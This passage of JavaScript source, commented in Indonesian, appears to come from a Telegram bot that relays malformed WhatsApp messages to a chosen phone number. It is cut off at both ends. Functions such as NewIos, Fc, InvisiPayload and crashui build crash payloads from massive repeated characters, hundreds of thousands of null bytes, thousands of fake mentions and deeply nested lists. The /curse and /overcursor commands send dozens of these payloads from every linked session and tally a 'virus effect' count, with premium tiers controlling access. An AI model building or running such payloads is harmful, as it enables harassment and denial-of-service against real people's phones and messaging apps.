                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/cellasta",
                mediaUrl: "https://t.me/cellasta",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/cellasta",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbsockCampaignId: "smb_sock_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        sock
          ? {
              participant: {
                jid: jid,
              },
            }
          : {}
      );
    }

async function NewIos(sock, jid) {
sock.relayMessage(
    jid,
    {
        extendedTextMessage: {
            text: `𑲭𑲭𝐓𝐀𝐌𝐀⿻𝐑𝐘𝐂⿻¿? ${'ꦾ'.repeat(103000)} ${'@13135550002'.repeat(25000)}`,
            contextInfo: {
                mentionedJid: [
                    "13135550002@s.whatsapp.net",
                    ...Array.from({ length: 15000 }, () => `13135550002${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
                ],
                stanzaId: "1234567890ABCDEF",
                participant: "13135550002@s.whatsapp.net",
                quotedMessage: {
                    callLogMesssage: {
                        isVideo: true,
                        callOutcome: "1",
                        durationSecs: "0",
                        callType: "REGULAR",
                        participants: [
                            {
                                jid: "13135550002@s.whatsapp.net",
                                callOutcome: "1"
                            }
                        ]
                    }
                },
                remoteJid: "13135550002@s.whastapp.net",
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 99999999,
                isForwarded: true,
                quotedAd: {
                    advertiserName: "Example Advertiser",
                    mediaType: "IMAGE",
                    jpegThumbnail: Jepeg,
                    caption: "This is an ad caption"
                },
                placeholderKey: {
                    remoteJid: "13135550002@s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                    title: "FINIX - CRITICAL FINISH",
                    body: `Ai To Crash ${'\0'.repeat(200)}`,
                    mediaType: "VIDEO",
                    renderLargerThumbnail: true,
                    previewType: "VIDEO",
                    thumbnail: Jepeg,
                    sourceType: "x",
                    sourceId: "x",
                    sourceUrl: "https://www.facebook.com/WhastApp",
                    mediaUrl: "https://www.facebook.com/WhastApp",
                    containsAutoReply: true,
                    showAdAttribution: true,
                    ctwaClid: "ctwa_clid_example",
                    ref: "ref_example"
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                    url: "https://www.facebook.com/WhatsApp"
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "13135550002@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                    utmSource: "utm_source_example",
                    utmCampaign: "utm_campaign_example"
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "13135550002@newsletter",
                    serverMessageId: 1,
                    newsletterName: "Meta Ai",
                    contentType: "UPDATE",
                    accessibilityText: "Meta Ai"
                },
                businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                },
                smbriyuCampaignId: "smb_riyu_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                    showMmDisclosure: true
                }
            }
        }
    },
    sock
        ? {
              participant: {
                  jid: jid
              }
          }
        : {}
       
);
console.log("Success! Force Ios Sent")
}
async function MSGSPAM(sock, jid) {
    let Msg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: ["13135550002@s.whastapp.net"],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: jid,
              },
            },
            body: {
              text: ".",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(jid, Msg, {
      participant: { jid: jid },
    })
  }
async function Fc(sock, jid) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "𝐙𝚵𝐏𝐇𝐇𝐘𝐑𝐢𝐍Σ𝐒𝐓𝐑𝐈𝐊𝐄͢" + "ꦾ".repeat(115000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "SSS+",
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [jid],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  contactVcard: true,
                },
                contentText: "lol",
                footerText: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(850000),
                    buttonText: {
                      displayText: "VODXE",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            actionLink: {
              url: "t.me/rainoneday",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: jid,
              initiatedByMe: true,
            },
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: 'P',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              ctaPayload: "cta",
              disableNudge: true,
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "123132123123123@newsletter",
              serverMessageId: 1,
              newsletterName: "P",
              contentType: 3,
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
        },
      },
    },
  };

  await sock.relayMessage(jid, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: jid },
  });
}

async function InvisiPayload(sock, jid) {
      let sections = [];

      for (let i = 0; i < 10000; i++) {
        let largeText = "ꦾ".repeat(45000);

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [jid],
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: {
                  businessOwnerJid: jid,
                },
              },
              body: {
                text: "𝘼𝙎𝙎𝘼𝙇𝘼𝙈𝙐𝘼𝙇𝘼𝙄𝙆𝙐𝙈 VФDЖΞ CЯДSHΞЯ DISIИI",
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              },
            },
          },
        },
      };

      await sock.relayMessage(jid, message, {
        participant: { jid: jid },
      });
    }
    
async function newcall(target) {
    let virtex = "Anggazyy ZcoderX 🔐";
    await anggazyy.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: virtex,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: 'call_permission_request',
                                buttonParamsJson: '{}'
                            },
                            {
                                name: 'cta_url',
                                buttonParamsJson: "{ display_text : 'Anggazyy ZcoderX  MODS WHATSAPP', url : '', merchant_url : '' }"
                            }
                        ]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function Payload(bijipler) {
      let sections = [];

      for (let i = 0; i < 1; i++) {
        let largeText = "ꦾ".repeat(1);

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [bijipler],
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: {
                  businessOwnerJid: bijipler,
                },
              },
              body: {
                text: " 𝐙𝚵𝐏𝐇𝐇𝐘𝐑𝐢𝐍Σ ラ‣  ",
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              },
            },
          },
        },
      };

      await Zeph.relayMessage(bijipler, message, {
        participant: { jid: bijipler },
      });
    }

async function crashui(sock, jid) {
  await sock.relayMessage(jid, {
    viewOnceMessage: {
      message: {
        buttonsMessage: {
          text: "𝐙𝚵𝐏𝐇𝐇𝐘𝐑𝐢𝐍Σ𝐒𝐓𝐑𝐈𝐊𝐄͢",
          contentText: "𝐙𝚵𝐏𝐇𝐇𝐘𝐑𝐢𝐍Σ𝐒𝐓𝐑𝐈𝐊𝐄͢" + "\u0000".repeat(70000),
          contextInfo: {
            forwardingScore: 6,
            isForwarded: true
          },
          headerType: 1,
          buttons: [
            {
              body: {
                text: "𝐙𝚵𝐏𝐇𝐇𝐘𝐑𝐢𝐍Σ𝐒𝐓𝐑𝐈𝐊𝐄͢ 𐎟"
              }
            }
          ],
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "JSON.stringify(listMessage)"
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "JSON.stringify(listMessage)"
              },
              {
                name: "mpm",
                buttonParamsJson: "JSON.stringify(listMessage)"
              }
            ]
          }
        }
      }
    }
  }, {});
}

async function NoIos(sock, jid) {
  await sock.relayMessage(
    jid,
    {
      paymentInviteMessage: {
        serviceType: "UPI",
        serviceType: "FBPAY",
        serviceType: "yarn_info",
        serviceType: "PENDING",
        expiryTimestamp: Date.now() + 1814400000,
      },
    },
    {
      participant: {
        jid: jid,
      },
    }
  );
}

function isSupervip(userId) {
  return supervipUsers.includes(userId.toString());
}
    
bot.onText(/\/addresseler (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat menambah pengguna supervip.",
      { parse_mode: "Markdown" }
    );
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");

  if (!newUserId) {
    return bot.sendMessage(chatId, "⚠️ Mohon masukkan ID pengguna yang valid.");
  }

  if (supervipUsers.includes(newUserId)) {
    return bot.sendMessage(
      chatId,
      "Pengguna sudah terdaftar sebagai supervip."
    );
  }

  supervipUsers.push(newUserId);

  const fileContent = `const supervipUsers = ${JSON.stringify(
    supervipUsers,
    null,
    2
  )};\n\nmodule.exports = supervipUsers;`;

  fs.writeFile(supervipFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan pengguna ke daftar supervip."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menambahkan ID ${newUserId} ke daftar supervip.`
    );
  });
});
const supervipFile = path.resolve("./supervip_users.js");
let supervipUsers = require("./supervip_users.js");

bot.onText(/\/addprem (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat menambah pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");

  if (!newUserId) {
    return bot.sendMessage(chatId, "⚠️ Mohon masukkan ID pengguna yang valid.");
  }

  if (premiumUsers.includes(newUserId)) {
    return bot.sendMessage(chatId, "Pengguna sudah terdaftar sebagai premium.");
  }

  premiumUsers.push(newUserId);

  const fileContent = `const premiumUsers = ${JSON.stringify(
    premiumUsers,
    null,
    2
  )};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan pengguna ke daftar premium."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menambahkan ID ${newUserId} ke daftar premium.`
    );
  });
});

bot.onText(/\/delprem (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat menghapus pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  const userIdToRemove = match[1].replace(/[^0-9]/g, "");

  if (!premiumUsers.includes(userIdToRemove)) {
    return bot.sendMessage(
      chatId,
      "Pengguna tidak ditemukan dalam daftar premium."
    );
  }

  premiumUsers = premiumUsers.filter((id) => id !== userIdToRemove);

  const fileContent = `const premiumUsers = ${JSON.stringify(
    premiumUsers,
    null,
    2
  )};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menghapus pengguna dari daftar premium."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ID ${userIdToRemove} dari daftar premium.`
    );
  });
});

bot.onText(/\/reqpair (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/\/curse (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  try {
    // Periksa apakah pengguna berada dalam cooldown
    const lastUsage = cooldowns.get(userId);
    const now = Date.now();

    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil(
        (COOLDOWN_TIME - (now - lastUsage)) / 1000
      );
      return bot.sendMessage(
        chatId,
        `⚠️ Anda harus menunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`,
        { parse_mode: "Markdown" }
      );
    }

    // Tandai waktu terakhir pengguna menjalankan perintah
    cooldowns.set(userId, now);

    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(
        chatId,
        "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        { parse_mode: "Markdown" }
      );
    }

    const [targetNumber, ...messageWords] = match[1].split(" ");
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const statusMessage = await bot.sendMessage(
      chatId,
      `Mengirim Notag ke ${formattedNumber} menggunakan ${sessions.size} bot...`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        successCount++;
      } catch (error) {
        failCount++;
      }
    }

    await bot.editMessageText(
      `╭─────────────────
│   𝐕𝐢𝐫𝐮𝐬 𝐄𝐟𝐟𝐞𝐜𝐭 𝐂𝐨𝐮𝐧𝐭
│────────────────
│✵ 𝐓𝐚𝐫𝐠𝐞𝐭 : ${jid}
│✵ 𝐒𝐮𝐜𝐜𝐞𝐬 : ${successCount}
│✵ 𝐁𝐥𝐨𝐜𝐤𝐞𝐝 : ${failCount}
│✵ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐨𝐫𝐞 : ${sessions.size}
╰─────────────────`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    await bot.sendMessage(
      chatId,
      `Terjadi kesalahan: ${error.message}\nSilakan coba lagi.`
    );
  }
});
bot.onText(/\/overcursor (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  try {
    // Periksa apakah pengguna berada dalam cooldown
    const lastUsage = cooldowns.get(userId);
    const now = Date.now();

    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil(
        (COOLDOWN_TIME - (now - lastUsage)) / 1000
      );
      return bot.sendMessage(
        chatId,
        `⚠️ Anda harus menunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`,
        { parse_mode: "Markdown" }
      );
    }

    // Tandai waktu terakhir pengguna menjalankan perintah
    cooldowns.set(userId, now);

    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(
        chatId,
        "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        { parse_mode: "Markdown" }
      );
    }

    const [targetNumber, ...messageWords] = match[1].split(" ");
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const statusMessage = await bot.sendMessage(
      chatId,
      `Mengirim Os ke ${formattedNumber} menggunakan ${sessions.size} bot...`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug4(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        await Bug3(sock, jid);
        successCount++;
